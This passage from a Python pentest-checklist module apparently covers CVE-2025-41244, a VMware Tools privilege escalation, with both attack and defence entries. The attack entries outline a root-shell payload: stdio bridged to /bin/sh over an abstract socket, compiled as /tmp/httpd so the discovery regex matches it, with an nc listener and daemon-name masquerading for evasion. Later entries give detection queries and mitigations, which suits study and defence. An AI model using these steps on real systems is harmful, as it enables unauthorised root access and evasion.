                            'Step 8: Binary spawns root shell back to attacker'
                        ],
                        'notes': 'Vulnerable patterns: /\\S+/(httpd|nginx|mysqld|dataserver) - accepts any path. Discovery runs as root.',
                        'estimated_time': '10-15 minutes setup + 5 min wait'
                    }
                },
                # Example payload
                {
                    'id': f'vmware-payload-example-{target}',
                    'name': 'Example Payload Binary',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Minimal C program for VMware Tools exploitation',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'CODE'],
                        'alternatives': [
                            'Default mode: Open TCP listener on any port (to be enumerated)',
                            'When argv[1] == "-v" or "--version": Connect to abstract UNIX socket @exploit',
                            'Bridge stdio to /bin/sh -i',
                            'Compile: gcc -o /tmp/httpd payload.c',
                            'On attacker: nc -lU @exploit  # Listen on abstract socket',
                            'When discovery runs: Root shell appears on @exploit listener'
                        ],
                        'notes': 'Abstract UNIX socket avoids filesystem artifacts. Name binary httpd/nginx/mysqld to match regex.',
                        'estimated_time': '15-20 minutes development'
                    }
                },
                # Discovery cycle timing
                {
                    'id': f'vmware-discovery-timing-{target}',
                    'name': 'Service Discovery Cycle Timing',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Understand VMware Tools discovery scheduling for reliable exploitation',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'TECHNIQUE'],
                        'alternatives': [
                            'Historical: ~5 minute intervals',
                            'Credential-based: Aria Operations SDMP runs via vmtoolsd with privileged creds',
                            'Credential-less: Discovery runs within vmtoolsd (already privileged)',
                            'Artifacts: /tmp/VMware-SDMP-Scripts-{UUID}/ (credential-based mode)',
                            'Check logs: journalctl -u vmtoolsd | grep -i discovery'
                        ],
                        'notes': 'Both modes vulnerable. Credential-less runs as root directly. Credential-based uses configured privileged account.',
                        'estimated_time': 'N/A - timing information'
                    }
                },
                # DFIR and detection
                {
                    'id': f'vmware-detection-{target}',
                    'name': 'Detect VMware Tools Exploitation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Hunting queries and detection logic for CVE-2025-41244',
                        'tags': ['OSCP:LOW', 'MANUAL', 'DEFENSIVE'],
                        'alternatives': [
                            'Hunt: Uncommon children of vmtoolsd or get-versions.sh',
                            'Alert: Execution from non-system paths: ^/(tmp|home|var/tmp|dev/shm)/',
                            'Process tree: ps -ef --forest  # Look for vmtoolsd -> /tmp/httpd',
                            'Artifacts: Check /tmp/VMware-SDMP-Scripts-*/script_*.stdout for rogue paths',
                            'File integrity: Monitor get-versions.sh for tampering',
                            'Mitigation: Patch to fixed VMware Tools version, restrict discovery to allowlisted paths'
                        ],
                        'notes': 'Blue team guidance. Broadcom/VMware patch available. Validate trusted paths, not permissive regex.',
                        'estimated_time': 'N/A - detection guidance'
                    }
                },
                # Masquerading technique
                {
                    'id': f'vmware-masquerade-{target}',
                    'name': 'Service Name Masquerading (MITRE T1036.005)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Name malicious binary like common daemons to match discovery regex and blend in',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'TECHNIQUE'],
                        'alternatives': [
                            'Common targets: httpd, nginx, mysqld, dataserver, apache2',
                            'Stealth: Binary appears legitimate in process listings',
                            'Detection evasion: Matches expected daemon names',
                            'Portable: Same technique works across many monitoring/discovery tools',
                            'MITRE ATT&CK: T1036.005 - Match Legitimate Name or Location'
                        ],
                        'notes': 'General technique for regex-driven discovery abuse. Not specific to VMware Tools.',
                        'estimated_time': 'N/A - technique documentation'
                    }
                },
                # Mitigation recommendations
                {
                    'id': f'vmware-mitigations-{target}',
                    'name': 'Mitigation Recommendations',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Secure service discovery implementation patterns',
                        'tags': ['OSCP:LOW', 'MANUAL', 'DEFENSIVE'],
                        'alternatives': [
                            'Patch: Apply Broadcom/VMware updates for CVE-2025-41244',
                            'Allowlist: Restrict execution to /usr/sbin, /usr/bin, /sbin, /bin only',
                            'Exact matching: Avoid permissive regex with \\S, use anchored paths',
                            'Drop privs: Run discovery helpers with reduced privileges',
                            'Sandbox: Use seccomp/AppArmor to limit discovery script capabilities',
                            'Disable: Turn off credential-less discovery where not needed'
                        ],
                        'notes': 'Root cause: CWE-426 Untrusted Search Path. Fix: Validate trusted paths, not pattern matching.',
                        'estimated_time': 'N/A - mitigation guidance'
                    }
                }
            ]
        }
